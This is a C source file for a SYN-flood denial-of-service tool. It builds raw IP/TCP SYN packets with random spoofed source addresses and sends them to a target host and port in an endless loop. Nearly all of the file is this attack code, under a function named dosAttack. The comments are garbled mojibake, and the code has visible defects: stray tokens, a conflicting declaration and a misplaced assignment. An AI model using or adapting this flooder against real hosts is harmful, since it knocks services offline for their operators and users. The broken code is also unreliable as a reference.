#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>

#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <linux/tcp.h>
#include <arpa/inet.h>


void dosAttack(int skFd,struct sockaddr_in* target,unsigned short srcPort);
unsigned short check_sum(unsigned short * addr, int count);


//1.ip,2.Ŀ�Ķ˿�,3.Դ�˿�
int main(int argc,char** argv)
{

    int connFd;
    struct sockaddr_in target;
    struct hostent* host;
    const int on=1;
    unsigned short srcPort;

    //���������õ�ַ����
    bzero(&target, sizeof(struct sockaddr_in));
    //����target����
    target.sin_family=AF_INET;
    //host->net(str->int(�ڶ�������))
    target.sin_port=htons(atoi(argv[2]));//
    //
    if(inet_aton(argv[1],&target.sin_addr)==0)
    {
        //��ȡ������ַ
        host=gethostbyname(argv[1]);
        if(host==NULL)
            perror("get host by name error!\n");
        target.sin_addr=*(struct in_addr*)(host->h_addr_list[0]);
    }

    //����ԭʼ�׽���
    if(connFd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)==-1)
        perror("socket error\n");

    //(���Ӿ��,ָ��Ϊip,�ɱ༭ͷģʽ,��,�򿪴�С)
    if(setsockopt(connFd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on))==-1)
        perror("setsockopt error\n");

    //��ȡ����ԱȨ�޲���raw sock
    setuid(getuid());//����Ϊ����Ա
    //��ȡԴ�˿�ת��Ϊint
    srcPort=atoi(argv[3]);
    socket
    //����Э������ݰ��齨
    dosAttack(connFd,&target,srcPort);
    
}



void dosAttack(int skFd,struct sockaddr_in* target,unsigned short srcPort)
{
    int ipLen;
    char buf[128]={};
    struct ip* ip=(struct ip*)buf;
    struct tcphdr* tcp;
    struct ip ip;
    ip.ar_request
    //����SYN�������ݳ���
    ipLen=sizeof(struct ip)+sizeof(struct tcphdr);
    //���ipͷ
    ip->ip_hl=sizeof(struct ip)>>2;//����4
    ip->ip_v=IPVERSION; 
    ip->ip_tos=0;   /* type of service */
    ip->ip_len=htons(ipLen);
    ip->ip_id=0;
    ip->ip_off=0;//Ƭƫ��offset
    ip->ip_ttl=MAXTTL;
    ip->ip_p=IPPROTO_TCP;//Э��:ipЭ��ջ��tcpЭ��
    ip->ip_sum=0;
    ip->ip_dst=target->sin_addr;

    //���tcp����
    tcp=(struct tcphdr*)(buf+sizeof(struct ip));//ǰ�벿��ip�ڴ�,��벿��tcp
    tcp->source=htons(srcPort);//Դ�˿�(int->net)����������
    tcp->dest=target->sin_port;//Ŀ����˿�
    tcp->seq=random();//�����ʼ��һ��tcp���
    tcp->doff=5;
    tcp->syn=1;//ͬ��λ1
    tcp->check=0;
    
    while(1)
    {
        ip->ip_src.s_addr=random();//�������ԴIP
        //����tcpУ�麯��
        tcp->check=check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
        sendto(skFd,buf,ipLen,0,(struct sockaddr*)target,
            sizeof(struct sockaddr_in));
        
    }
}




unsigned short check_sum(unsigned short*addr,int len)
{
      register int nleft=len;
      register int sum=0;
      register short*w=addr;
      short    answer=0;
      while(nleft>1)
      {
          sum+=*w++;
          nleft-=2;
      }
      if(nleft==1)
      {
          *(unsigned char *)(&answer)=*(unsigned char *)w;
          sum+=answer;
      }
      sum=(sum>>16)+(sum&0xffff);
      sum+=(sum>>16);
      answer=~sum;
      return(answer);
}





















